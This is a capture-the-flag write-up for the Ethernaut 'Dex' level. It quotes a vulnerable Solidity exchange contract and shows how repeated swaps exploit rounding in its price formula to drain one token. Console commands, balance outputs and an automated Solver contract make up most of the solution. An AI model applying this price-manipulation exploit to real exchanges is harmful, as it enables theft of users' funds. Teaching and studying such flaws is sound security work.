![Dex](/assets/img/BigLevel22.svg)

- [Challenge](#challenge)
- [Solution](#solution)
   
# Challenge

The level reads:

> The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.
> 
> 
> You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.
> 
> You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
> 
> #### Quick note
> 
> Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.
> 
> Things that might help:
> 
> - How is the price of the token calculated?
> - How does the `swap` method work?
> - How do you `approve` a transaction of an ERC20?
> - Theres more than one way to interact with a contract!
> - Remix might help
> - What does "At Address" do?

And gives us the following contract's code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

# Solution

As usual, we start analyzing the given contract's code and interacting with it.

We have two tokens which are referenced by token1 and token2 variables, these tokens are `SwappableToken` instances.

Then we have the `Dex` contract which is a decentralized exchange. This contract has 6 functions:

- `setTokens(address _token1, address _token2)`: this function updates the variables `token1` and `token2` with the addresses from the parameters.
- `addLiquidity(address token_address, uint amount)`: this function transfers the specified amount of the given token from the `msg.sender` to the `Dex` contract, adding funds to the liquidity pool.
- `swap(address from, address to, uint amount)`: calling swap transfers the given amount from the token specified in the `from` parameter to the contract, and then the contract transfers the equivalent amount from the token specified in the `to` parameter to the `msg.sender`. The exchange rate is gotten from calling `getSwapPrice()`. Note that the `msg.sender` needs to approve the contract from transferring their tokens from beforehand.
- `getSwapPrice(address from, address to, uint amount`: this function returns the equivalent amount of the token specified in the `to` variable. To do this calculation if first multiplies the given amount by the balance of the tokens specified in the `to` address in the liquidity pool and then divides that value by the balance of the tokens specified in the address `from`. For example, let's suppose that the contract has 200 token1 and 100 token2 in the liquidity pool. If someone wants to trade 50 token1 for token2, `getSwapPrice` will return $50*200/100 = 100$ then, if they call swap(token1, token2, 50) the exchange will transfer 50 token1 from the sender to the contract and then transfer 100 token2 from the exchange to the sender.
- `approve(address spender, uint amount)`: this function was added to keep with the syntax of the game, it just approves the `Dex` contract to transfer the specified amount of token1 and 2 from the sender.
- `balanceOf(address token, address account)`: it returns the amount of tokens an address has.

To win this level we need to drain the total amount of one of the tokens from the contract. Just by reading the code, we see that some calculations doesn't look too reliable. Let's analyze what would happen if someone would exchange large amounts of tokens at the exchange.

We have 10 `token1` and 10 `token2` while the `Dex` contract has 100 of each:

```javascript
await contract.balanceOf(token1, player).then(v=>parseInt(v))
10

await contract.balanceOf(token2, player).then(v=>parseInt(v))
10

await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
100

await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
100
``` 

If we were to exchange all of our token1 for token2. The contract will call:

```javascript
await contract.getSwapPrice(token1, token2, 10).then(v=>parseInt(v))
10
``` 

Where does this value come from? getSwapPrice would multiply "what we want to exchange from token1" by "the balance of the dex of token2" divided by "the balance of the dex of token1". This is $10*100/100 = 10$. Then, if we exchange 10 token1 we would get 10 token2. Pretty simple and straight forward right? How would the liquidity pool and our balances look after that exchange? We would have 0 token1 and 20 token2, and the exchange would have 110 token1 and 90 token2... 

Now, what would happen if we call swap again but this time we want to exchange all of our token2? $20\*110/90$ right? Also note the order of the operations of the getSwapPrice function! It actually does $(20*110)/90$ which is $2200/90 => 24.44$ as they are `uint` this will actually return "24". So if we change all of or 20 token2 we will get 24 token1? Remember that we started this level with 20 tokens in total... and the exchange rate was 1:1, but now we have 24 tokens? We start to see a pattern right?

At this point we have 24 token1 and 0 token2, and the exchange has 86 token1 and 110 token2. Now, let's exchange are 24 token1: $\frac{24*110}{86} = 30$.

We then have 0 token1, 30 token2 and the dex has 110 and 80 respectively. Let's swap again all of our token2: $\frac{30*110}{80} = 41$.

Our balance is now 41 token1, 0 token2 and the exchange's 69 token1 and 110 token2. So? We swap again! $\frac{41*110}{69} = 65$.

By now, we have 0 token1 and 65 token2, and the contract has 110 token1 and 45 token2. If at this point we would want to swap all of our 65 token2 the swapAmount of token1 would be 158, but the exchange doesn't have that amount of token1, then this transaction would get reverted. We need to calculate how many tokens we have to transfer to get the 110 token1 of the exchange. Then we need to find $x$ such that:

$\frac{x * 110}{45} = 110$

$x = \frac{110*45}{110}$ 

$x = 45$

So, if we now swap 45 token2 we would get 110 token1, by doing this we would be winning the level. Also note that if at this point someone calls `getSwapPrice(token1, token2, 1)` this will try to do $\frac{1 * 90}{0}$ and will fail.

Now that we know what we have to do to win the level, let's do it:

```javascript
contract.approve(contract.address, 1000)
-------------------------------------------------------------
await contract.swap(token1, token2, await contract.balanceOf(token1, player).then(v=>parseInt(v))) // here I swap all of my token1 for token2

await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
110

await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
90

await contract.balanceOf(token1, player).then(v=>parseInt(v))
0

await contract.balanceOf(token2, player).then(v=>parseInt(v))
20
-------------------------------------------------------------
await contract.swap(token2, token1, await contract.balanceOf(token2, player).then(v=>parseInt(v))) // here I swap all of my token2 for token1

await contract.balanceOf(token1, player).then(v=>parseInt(v))
24

await contract.balanceOf(token2, player).then(v=>parseInt(v))
0

await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
86

await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
110
-------------------------------------------------------------
await contract.swap(token1, token2, await contract.balanceOf(token1, player).then(v=>parseInt(v))) // here I swap all of my token1 for token2

await contract.balanceOf(token1, player).then(v=>parseInt(v))
0
await contract.balanceOf(token2, player).then(v=>parseInt(v))
30
await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
110
await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
80
-------------------------------------------------------------
await contract.swap(token2, token1, await contract.balanceOf(token2, player).then(v=>parseInt(v))) // here I swap all of my token2 for token1

await contract.balanceOf(token1, player).then(v=>parseInt(v))
41
await contract.balanceOf(token2, player).then(v=>parseInt(v))
0
await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
69
await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
110
-------------------------------------------------------------
await contract.swap(token1, token2, await contract.balanceOf(token1, player).then(v=>parseInt(v))) // here I swap all of my token1 for token2

await contract.balanceOf(token1, player).then(v=>parseInt(v))
0
await contract.balanceOf(token2, player).then(v=>parseInt(v))
65
await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
110
await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
45
-------------------------------------------------------------
await contract.swap(token2, token1, 45) // here we swap only 45 token2 to get the 110 token1

await contract.balanceOf(token1, player).then(v=>parseInt(v))
110
await contract.balanceOf(token2, player).then(v=>parseInt(v))
20
await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
0
await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
90
-------------------------------------------------------------
await contract.getSwapPrice(token1, token2, 1).then(v=>parent(v))
inpage.js:1 MetaMask - RPC Error: execution reverted {code: -32603, message: 'execution reverted', data: {…}}
```

Then, we won the level!!! We just need to "Submit Instance" :)

![Well done](/assets/img/ethernaut_solved.png)

I've also written a solution for this level but automated by a contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Dex.sol";

contract Solver {
    Dex dex;
    address token1;
    address token2;

    constructor(address _dexAddress) {
        dex = Dex(_dexAddress);
        token1 = dex.token1();
        token2 = dex.token2();
        dex.approve(address(dex), 1000);
    }

    function solve() public {
        uint balanceToken1 = dex.balanceOf(token1, address(this));
        uint balanceToken2 = dex.balanceOf(token2, address(this));
        uint dexBalanceToken1 = dex.balanceOf(token1, address(dex));
        uint dexBalanceToken2 = dex.balanceOf(token2, address(dex));

        while ( balanceToken1 < dexBalanceToken1 && balanceToken2 < dexBalanceToken2 ) {
            if ( balanceToken1 > 0 ) {
                dex.swap(token1, token2, balanceToken1);
                balanceToken1 = 0;
                balanceToken2 = dex.balanceOf(token2, address(this));
            } else {
                dex.swap(token2, token1, balanceToken2);
                balanceToken1 = dex.balanceOf(token1, address(this));
                balanceToken2 = 0;
            }
            dexBalanceToken1 = dex.balanceOf(token1, address(dex));
            dexBalanceToken2 = dex.balanceOf(token2, address(dex));
        }
        if ( balanceToken1 > 0 ) {
            dex.swap(token1, token2, dexBalanceToken1);
        } else {
            dex.swap(token2, token1, dexBalanceToken2);
        }
    }
}
```

To use the `Solver` we need to:
1. Deploy `Solver` inputting the address of the `Dex` contract (I've done this using Remix and setting the "Injected Provider - Metamask")
2. Use the remix' functionality "At address" to set the `Dex` and the `SwappableToken' contracts for dex, token1 and token2 addresses.
3. Transfer our 10 token1 and token2 to the `Solver`, by calling `transfer()` from the `SwappableToken`'s token1 and token2.
4. Call `solve()`

After doing all of this we can check the balances to verify that the contract has solved the level:

```javascript
await contract.balanceOf(token1, solverAddress).then(v=>parseInt(v))
110
await contract.balanceOf(token2, solverAddress).then(v=>parseInt(v))
20
await contract.balanceOf(token1, contract.address).then(v=>parseInt(v))
0
await contract.balanceOf(token2, contract.address).then(v=>parseInt(v))
90
```